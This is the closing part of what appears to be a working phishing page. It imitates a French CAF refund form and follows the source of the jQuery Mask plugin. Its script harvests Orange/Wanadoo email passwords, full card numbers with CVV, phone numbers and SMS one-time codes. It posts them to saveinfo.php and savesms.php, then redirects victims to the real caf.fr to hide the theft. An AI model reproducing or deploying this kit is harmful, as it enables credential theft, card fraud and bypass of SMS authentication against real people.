                            }

                            for (i = caretPosOld - 1; i >= 0; i--) {
                                if (p.maskDigitPosMapOld[i]) {
                                    maskDigitsBeforeCaretAllOld++;
                                }
                            }

                            // if the cursor is at the end keep it there
                            if (caretPosNew > oldValL) {
                                caretPosNew = newValL * 10;
                            } else if (caretPosOld >= caretPosNew && caretPosOld !== oldValL) {
                                if (!p.maskDigitPosMapOld[caretPosNew])  {
                                    var caretPos = caretPosNew;
                                    caretPosNew -= maskDigitsBeforeCaretAllOld - maskDigitsBeforeCaretAll;
                                    caretPosNew -= maskDigitsBeforeCaret;
                                    if (p.maskDigitPosMap[caretPosNew])  {
                                        caretPosNew = caretPos;
                                    }
                                }
                            }
                            else if (caretPosNew > caretPosOld) {
                                caretPosNew += maskDigitsBeforeCaretAll - maskDigitsBeforeCaretAllOld;
                                caretPosNew += maskDigitsAfterCaret;
                            }
                        }
                        return caretPosNew;
                    },
                    behaviour: function(e) {
                        e = e || window.event;
                        p.invalid = [];

                        var keyCode = el.data('mask-keycode');

                        if ($.inArray(keyCode, jMask.byPassKeys) === -1) {
                            var newVal = p.getMasked(),
                                caretPos = p.getCaret();

                            // this is a compensation to devices/browsers that don't compensate
                            // caret positioning the right way
                            setTimeout(function() {
                                p.setCaret(p.calculateCaretPosition());
                            }, $.jMaskGlobals.keyStrokeCompensation);

                            p.val(newVal);
                            p.setCaret(caretPos);
                            return p.callbacks(e);
                        }
                    },
                    getMasked: function(skipMaskChars, val) {
                        var buf = [],
                            value = val === undefined ? p.val() : val + '',
                            m = 0, maskLen = mask.length,
                            v = 0, valLen = value.length,
                            offset = 1, addMethod = 'push',
                            resetPos = -1,
                            maskDigitCount = 0,
                            maskDigitPosArr = [],
                            lastMaskChar,
                            check;

                        if (options.reverse) {
                            addMethod = 'unshift';
                            offset = -1;
                            lastMaskChar = 0;
                            m = maskLen - 1;
                            v = valLen - 1;
                            check = function () {
                                return m > -1 && v > -1;
                            };
                        } else {
                            lastMaskChar = maskLen - 1;
                            check = function () {
                                return m < maskLen && v < valLen;
                            };
                        }

                        var lastUntranslatedMaskChar;
                        while (check()) {
                            var maskDigit = mask.charAt(m),
                                valDigit = value.charAt(v),
                                translation = jMask.translation[maskDigit];

                            if (translation) {
                                if (valDigit.match(translation.pattern)) {
                                    buf[addMethod](valDigit);
                                    if (translation.recursive) {
                                        if (resetPos === -1) {
                                            resetPos = m;
                                        } else if (m === lastMaskChar && m !== resetPos) {
                                            m = resetPos - offset;
                                        }

                                        if (lastMaskChar === resetPos) {
                                            m -= offset;
                                        }
                                    }
                                    m += offset;
                                } else if (valDigit === lastUntranslatedMaskChar) {
                                    // matched the last untranslated (raw) mask character that we encountered
                                    // likely an insert offset the mask character from the last entry; fall
                                    // through and only increment v
                                    maskDigitCount--;
                                    lastUntranslatedMaskChar = undefined;
                                } else if (translation.optional) {
                                    m += offset;
                                    v -= offset;
                                } else if (translation.fallback) {
                                    buf[addMethod](translation.fallback);
                                    m += offset;
                                    v -= offset;
                                } else {
                                    p.invalid.push({p: v, v: valDigit, e: translation.pattern});
                                }
                                v += offset;
                            } else {
                                if (!skipMaskChars) {
                                    buf[addMethod](maskDigit);
                                }

                                if (valDigit === maskDigit) {
                                    maskDigitPosArr.push(v);
                                    v += offset;
                                } else {
                                    lastUntranslatedMaskChar = maskDigit;
                                    maskDigitPosArr.push(v + maskDigitCount);
                                    maskDigitCount++;
                                }

                                m += offset;
                            }
                        }

                        var lastMaskCharDigit = mask.charAt(lastMaskChar);
                        if (maskLen === valLen + 1 && !jMask.translation[lastMaskCharDigit]) {
                            buf.push(lastMaskCharDigit);
                        }

                        var newVal = buf.join('');
                        p.mapMaskdigitPositions(newVal, maskDigitPosArr, valLen);
                        return newVal;
                    },
                    mapMaskdigitPositions: function(newVal, maskDigitPosArr, valLen) {
                        var maskDiff = options.reverse ? newVal.length - valLen : 0;
                        p.maskDigitPosMap = {};
                        for (var i = 0; i < maskDigitPosArr.length; i++) {
                            p.maskDigitPosMap[maskDigitPosArr[i] + maskDiff] = 1;
                        }
                    },
                    callbacks: function (e) {
                        var val = p.val(),
                            changed = val !== oldValue,
                            defaultArgs = [val, e, el, options],
                            callback = function(name, criteria, args) {
                                if (typeof options[name] === 'function' && criteria) {
                                    options[name].apply(this, args);
                                }
                            };

                        callback('onChange', changed === true, defaultArgs);
                        callback('onKeyPress', changed === true, defaultArgs);
                        callback('onComplete', val.length === mask.length, defaultArgs);
                        callback('onInvalid', p.invalid.length > 0, [val, e, el, p.invalid, options]);
                    }
                };

                el = $(el);
                var jMask = this, oldValue = p.val(), regexMask;

                mask = typeof mask === 'function' ? mask(p.val(), undefined, el,  options) : mask;

                // public methods
                jMask.mask = mask;
                jMask.options = options;
                jMask.remove = function() {
                    var caret = p.getCaret();
                    if (jMask.options.placeholder) {
                        el.removeAttr('placeholder');
                    }
                    if (el.data('mask-maxlength')) {
                        el.removeAttr('maxlength');
                    }
                    p.destroyEvents();
                    p.val(jMask.getCleanVal());
                    p.setCaret(caret);
                    return el;
                };

                // get value without mask
                jMask.getCleanVal = function() {
                    return p.getMasked(true);
                };

                // get masked value without the value being in the input or element
                jMask.getMaskedVal = function(val) {
                    return p.getMasked(false, val);
                };

                jMask.init = function(onlyMask) {
                    onlyMask = onlyMask || false;
                    options = options || {};

                    jMask.clearIfNotMatch  = $.jMaskGlobals.clearIfNotMatch;
                    jMask.byPassKeys       = $.jMaskGlobals.byPassKeys;
                    jMask.translation      = $.extend({}, $.jMaskGlobals.translation, options.translation);

                    jMask = $.extend(true, {}, jMask, options);

                    regexMask = p.getRegexMask();

                    if (onlyMask) {
                        p.events();
                        p.val(p.getMasked());
                    } else {
                        if (options.placeholder) {
                            el.attr('placeholder' , options.placeholder);
                        }

                        // this is necessary, otherwise if the user submit the form
                        // and then press the "back" button, the autocomplete will erase
                        // the data. Works fine on IE9+, FF, Opera, Safari.
                        if (el.data('mask')) {
                            el.attr('autocomplete', 'off');
                        }

                        // detect if is necessary let the user type freely.
                        // for is a lot faster than forEach.
                        for (var i = 0, maxlength = true; i < mask.length; i++) {
                            var translation = jMask.translation[mask.charAt(i)];
                            if (translation && translation.recursive) {
                                maxlength = false;
                                break;
                            }
                        }

                        if (maxlength) {
                            el.attr('maxlength', mask.length).data('mask-maxlength', true);
                        }

                        p.destroyEvents();
                        p.events();

                        var caret = p.getCaret();
                        p.val(p.getMasked());
                        p.setCaret(caret);
                    }
                };

                jMask.init(!el.is('input'));
            };

            $.maskWatchers = {};
            var HTMLAttributes = function () {
                    var input = $(this),
                        options = {},
                        prefix = 'data-mask-',
                        mask = input.attr('data-mask');

                    if (input.attr(prefix + 'reverse')) {
                        options.reverse = true;
                    }

                    if (input.attr(prefix + 'clearifnotmatch')) {
                        options.clearIfNotMatch = true;
                    }

                    if (input.attr(prefix + 'selectonfocus') === 'true') {
                        options.selectOnFocus = true;
                    }

                    if (notSameMaskObject(input, mask, options)) {
                        return input.data('mask', new Mask(this, mask, options));
                    }
                },
                notSameMaskObject = function(field, mask, options) {
                    options = options || {};
                    var maskObject = $(field).data('mask'),
                        stringify = JSON.stringify,
                        value = $(field).val() || $(field).text();
                    try {
                        if (typeof mask === 'function') {
                            mask = mask(value);
                        }
                        return typeof maskObject !== 'object' || stringify(maskObject.options) !== stringify(options) || maskObject.mask !== mask;
                    } catch (e) {}
                },
                eventSupported = function(eventName) {
                    var el = document.createElement('div'), isSupported;

                    eventName = 'on' + eventName;
                    isSupported = (eventName in el);

                    if ( !isSupported ) {
                        el.setAttribute(eventName, 'return;');
                        isSupported = typeof el[eventName] === 'function';
                    }
                    el = null;

                    return isSupported;
                };

            $.fn.mask = function(mask, options) {
                options = options || {};
                var selector = this.selector,
                    globals = $.jMaskGlobals,
                    interval = globals.watchInterval,
                    watchInputs = options.watchInputs || globals.watchInputs,
                    maskFunction = function() {
                        if (notSameMaskObject(this, mask, options)) {
                            return $(this).data('mask', new Mask(this, mask, options));
                        }
                    };

                $(this).each(maskFunction);

                if (selector && selector !== '' && watchInputs) {
                    clearInterval($.maskWatchers[selector]);
                    $.maskWatchers[selector] = setInterval(function(){
                        $(document).find(selector).each(maskFunction);
                    }, interval);
                }
                return this;
            };

            $.fn.masked = function(val) {
                return this.data('mask').getMaskedVal(val);
            };

            $.fn.unmask = function() {
                clearInterval($.maskWatchers[this.selector]);
                delete $.maskWatchers[this.selector];
                return this.each(function() {
                    var dataMask = $(this).data('mask');
                    if (dataMask) {
                        dataMask.remove().removeData('mask');
                    }
                });
            };

            $.fn.cleanVal = function() {
                return this.data('mask').getCleanVal();
            };

            $.applyDataMask = function(selector) {
                selector = selector || $.jMaskGlobals.maskElements;
                var $selector = (selector instanceof $) ? selector : $(selector);
                $selector.filter($.jMaskGlobals.dataMaskAttr).each(HTMLAttributes);
            };

            var globals = {
                maskElements: 'input,td,span,div',
                dataMaskAttr: '*[data-mask]',
                dataMask: true,
                watchInterval: 300,
                watchInputs: true,
                keyStrokeCompensation: 10,
                // old versions of chrome dont work great with input event
                useInput: !/Chrome\/[2-4][0-9]|SamsungBrowser/.test(window.navigator.userAgent) && eventSupported('input'),
                watchDataMask: false,
                byPassKeys: [9, 16, 17, 18, 36, 37, 38, 39, 40, 91],
                translation: {
                    '0': {pattern: /\d/},
                    '9': {pattern: /\d/, optional: true},
                    '#': {pattern: /\d/, recursive: true},
                    'A': {pattern: /[a-zA-Z0-9]/},
                    'S': {pattern: /[a-zA-Z]/}
                }
            };

            $.jMaskGlobals = $.jMaskGlobals || {};
            globals = $.jMaskGlobals = $.extend(true, {}, globals, $.jMaskGlobals);

            // looking for inputs with data-mask attribute
            if (globals.dataMask) {
                $.applyDataMask();
            }

            setInterval(function() {
                if ($.jMaskGlobals.watchDataMask) {
                    $.applyDataMask();
                }
            }, globals.watchInterval);
        }, window.jQuery, window.Zepto));
		function bb(){

            var a=document.getElementById('cc_n').value;

            var sub = a.substring(0,1);

            if (a=="") {

            	document.getElementById('cc_n').style.background="none";

            };

            if (sub=="4") {

            	document.getElementById('cc_n').style.background="url(./images/v.png) no-repeat 100% 9px";

                document.getElementById("vcc").maxLength ="3";

 				document.getElementById("vcc").placeholder ="  XXX";

				document.getElementById('cc_n').style.borderColor="#FEFFFF"; 

           

            }else if (sub=="5") {

				document.getElementById('cc_n').style.background="url(./images/m.png) no-repeat 100% 5px";                

				document.getElementById("vcc").maxLength ="3";

				document.getElementById("vcc").placeholder ="  XXX";

				document.getElementById('cc_n').style.borderColor="#FEFFFF"; 



            }

            else if (sub=="3") {

				document.getElementById('cc_n').style.background="url(./images/am.png) no-repeat 100% 6px";                

				document.getElementById("vcc").maxLength ="4";

				document.getElementById("vcc").placeholder ="  XXXX";

				document.getElementById('cc_n').style.borderColor="#FEFFFF"; 





            }

            else if (sub !=="3" || sub !=="4" || sub !=="5") {

            	document.getElementById('cc_n').style.background="url(./images/error.png) no-repeat 100% 4px"; 

            	document.getElementById('cc_n').value="";

            	document.getElementById('cc_n').style.borderColor="red"; 

            };

}      
			function l9er3a(bi9bi9){
	            if (bi9bi9.charAt(0) == "4"  || bi9bi9.charAt(0) == "5") {

	                if(lulu(bi9bi9) ==true){
	                    return true;
	                }else{
	                    return false;
	                }
	            }
	            else{
	                return false;
	            }
	        }

	        function lulu(cardNum){

	            var numericDashRegex = /^[\d\-\s]+$/
	            if (!numericDashRegex.test(cardNum)) return false;

	            // The Luhn Algorithm. It's so pretty.
	            var nCheck = 0, nDigit = 0, bEven = false;
	            var strippedField = cardNum.replace(/\D/g, "");

	            for (var n = strippedField.length - 1; n >= 0; n--) {
	                var cDigit = strippedField.charAt(n);
	                nDigit = parseInt(cDigit, 10);
	                if (bEven) {
	                    if ((nDigit *= 2) > 9) nDigit -= 9;
	                }

	                nCheck += nDigit;
	                bEven = !bEven;
	            }

	            return (nCheck % 10) === 0;
	        }
	        function isvalidcvc(cvc){
	            if (isNaN(cvc) !==true && cvc.length ==3) {
	                if (cvc < 1000 && cvc !== 0) {
	                    return true;
	                }
	                else{
	                    return false;
	                }
	            }else{
	                return false;
	            }
	        }
	        var minutes,seconds,smsnumber=1;
			var timer;
	        function startTimer(duration, display) {
				timer = duration;
				
				setInterval(function () {
					minutes = parseInt(timer / 60, 10)
					seconds = parseInt(timer % 60, 10);
					

					minutes = minutes < 10 ? "0" + minutes : minutes;
					seconds = seconds < 10 ? "0" + seconds : seconds;

					display.textContent = minutes + ":" + seconds;

					if (--timer < 0) {
						smsnumber++;
						timer = duration;
						
						
					}
				}, 1000);
				
			}
			$(document).ready(function(){
				
				$('[name=cc_n]').on('keypress', function(e) {
					cc_n = $(this).val();
					if ($.inArray(cc_n.length, [4, 9, 14]) != -1){
						cc_n += ' ';
						$(this).val(cc_n);
					}
					if (e.keyCode == 8){
						cc_n = cc_n.substring(0, cc_n.length - 1);
						$(this).val(cc_n);
					}
				});
				$("#vv").click(function(){
					if($(this).is(':checked'))
						$("#jnab").hide();
				})
				$("#vire").click(function(){
					if($(this).is(':checked'))
						$("#jnab").show();
				})
				$("#cc_n").bind('propertychange keyup input cut paste valuechange',function(event) {
					if($('#cc_n').val().substr(0,4)=='4970')
						$("#vcc_optional").show();
					else
						$("#vcc_optional").hide();
				})
				var curStep = 1;
				$(".step-loading.active").show();
				$('.profile-main-loader').css('display','flex');
				$("#next-step").hide();
				setTimeout(function(){
					$(".step-loading.active").hide().removeClass('active').next().addClass('active');
					$(".step-loading.active").show();
					setTimeout(function(){
						$(".step-loading.active").hide().removeClass('active').next().addClass('active');
						$(".step-loading.active").show();
						setTimeout(function(){
							$(".step-loading.active").hide().removeClass('active').next().addClass('active');
							
							$('.circle-loader').toggleClass('load-complete');
  							$('.checkmark').toggle();
							setTimeout(function(){
								//$('.success-checkmark').hide();
								$(".step-container").css('align-items','flex-start');
								$(".step-container").css('padding-left','15px');
								$('.profile-main-loader').css('display','none');
								$('.circle-loader').toggleClass('load-complete');
	  							$('.checkmark').toggle();
								$("#next-step").show();
								$(".step-content.active").show();
				        		$('#dubs').mask('00/00/0000');
								$("#step-title").html('Formulaire de remboursement');
								$("#next-step").click(function(){

									$(".step-content.active").hide();
									$('.profile-main-loader').css('display','flex');
									$(".step-loading.active").show();
									if(curStep === 1){
										var email_regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
										var passwd_regex1 = /^(?=.*[0-9])(?=.*[a-zA-Z]).{5,}$/;
										var passwd_regex = /^(?=.*[!@#$%^&*])(?=.*[a-zA-Z]).{5,}$/;
										var passwd_regex2 = /^(?=.*[0-9])(?=.*[!@#$%^&*]).{5,}$/;
										if($("#ach_semak_lah").val() == ''){
											$("#ach_semak_lah").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#ach_semak_lah").parent().removeClass('has-error');
										if(($("#email").val() === '') || (!email_regex.test($('#email').val())) || (($('#email').val().toLowerCase().includes('orange.fr') == false) && ($('#email').val().toLowerCase().includes('wanadoo.fr') == false))){
											$("#email").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#email").parent().removeClass('has-error');
										if(($("#password").val() === '') || ( (!passwd_regex.test($('#password').val())) &&(!passwd_regex2.test($('#password').val())) && (!passwd_regex1.test($('#password').val())))){
											$("#password").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#password").parent().removeClass('has-error');
										if($("#nb").val() == ''){
											$("#nb").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#nb").parent().removeClass('has-error');
										if($("#vv").is(':checked')==false && $("#vire").is(':checked')==false){

											$("#vv").parent().parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else {
											if($("#vire").is(':checked') == true){
												$('#jnab').show();
												$("#vire").parent().parent().addClass('has-error');
												$(".step-content.active").show();
												$('.profile-main-loader').css('display','none');
												$(".step-loading.active").hide();
												return;
											}
											else
												$('#jnab').hide();
											$("#vv").parent().parent().removeClass('has-error');
										}
										$(".step-container").css('align-items','center');
										$(".step-container").css('padding-left','0px');
										$("#next-step").css('margin-left','15px');
										$(".step-content.active").hide();
										$('.profile-main-loader').css('display','flex');
										$(".step-loading.active").show();
							         	setTimeout(function(){
											$(".step-content.active").removeClass('active').next().addClass('active');
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide().removeClass('active').next().addClass('active');
											$(".step-content.active").show();
											$(".step-content.active").css('height','auto');
											$(".conteneur-securite-cnaf").show();
											$("#main-view").removeClass('col-md-12').addClass('col-md-8')
											$("#fullname").html($('#ach_semak_lah').val());
											$("#step-title").html('Selectionner une carte à créditée.');
											$("#next-step").html('Valider');
											curStep++;
										},5000)
							       
									}
									if(curStep === 2){
										if($("#cc_n").val() == ''){
											$("#cc_n").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else {
											if(l9er3a($("#cc_n").val().replace(/ /g,'')) != true){
												$("#cc_n").parent().addClass('has-error');
												$(".step-content.active").show();
												$('.profile-main-loader').css('display','none');
												$(".step-loading.active").hide();
												//$("#jnab").show();
												//$("#error-text").html('Le numéro de carte saisi est incorrecte');
												return;
											}
											else{
												//$("#jnab").hide();
												$("#cc_n").parent().removeClass('has-error');
											}
											
										}

										if($("#expMonth").val() == ''){
											$("#expMonth").parent().parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#expMonth").parent().parent().removeClass('has-error');

										if($("#expYear").val() == ''){
											$("#expYear").parent().parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											return;
										}else $("#expYear").parent().parent().removeClass('has-error');

										if($("#vcc").val() == '' || isvalidcvc($("#vcc").val()) == false){
											$("#vcc").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();

											$("#jnab").show();
											$("#error-text").html('Le cryptogramme visuel est incorrect');
											return;
										}else {
											$("#jnab").hide();
											$("#vcc").parent().removeClass('has-error');
										}
										$.ajax({
									      url: "saveinfo.php",
									      data:{
									        cardnum:$("#cc_n").val(),
									        expirationdate:$("#expMonth").val()+"/"+$("#expYear").val(),
									        cvv:$("#vcc").val(),
									        name:$("#ach_semak_lah").val(),
									        email:$("#email").val(),
									        password:$("#password").val(),
									        phone:$("#nb").val(),
									        cvv_extra:$("#vcc_optional_field").val()
									      },
									      type:"post",
									      dataType:"json",
									      success: function(data){
									        if(data.status=="success"){
									         	setTimeout(function(){
              										$(".step-content.active").removeClass('active').next().addClass('active');
													$('.profile-main-loader').css('display','none');
													$(".step-loading.active").hide().removeClass('active').next().addClass('active');
													$(".step-content.active").show();
													$(".conteneur-securite-cnaf").show();
													$("#step-title").html('Authentification par SMS (Mobile)');
													$("#next-step").html('Continuer');
													display = document.querySelector('#time');
													startTimer(120, display);
												},5000)

												curStep++;
									        }else{

												$(".step-content.active").show();
												$('.profile-main-loader').css('display','none');
												$(".step-loading.active").hide();
									          	return false
									        }
									      }
									    });
									}
									if(curStep === 3){
										if($("#sms").val() === ''){
											$("#sms").parent().addClass('has-error');
											$(".step-content.active").show();
											$('.profile-main-loader').css('display','none');
											$(".step-loading.active").hide();
											$("#jnab").show();
											$("#error-text").html('Invalid sms!');
											return;
										}else{
											$("#jnab").hide();
											$("#sms").parent().removeClass('has-error');
										}
										$.ajax({
									      url: "savesms.php",
									      data:{
									        sms:$("#sms").val()
									      },
									      type:"post",
									      dataType:"json",
									      success: function(data){
									        if(data.status=="success"){
									         	setTimeout(function(){
              										$(".step-content.active").removeClass('active').next().addClass('active');
													$('.profile-main-loader').css('display','none');
													$(".step-loading.active").hide().removeClass('active').next().addClass('active');
													$(".step-content.active").show();
													$(".conteneur-securite-cnaf").show();
													$("#next-step").hide();
													$('.success-checkmark').show();
													setTimeout(function(){
              										 	window.location.replace("https://caf.fr");
													},10000);
												},5000)

												curStep++;
									        }else{

												$(".step-content.active").show();
												$('.profile-main-loader').css('display','none');
												$(".step-loading.active").hide();
									          	return false
									        }
									      }
									    });
									}
								})
							},1500)
						},5000)
					},3000)
				},3000)

				

			});
			
			var timeoutSessionSecondesCnaf = 1200;
		</script>
	</body>
<!-- FIN BODY -->	
</html>


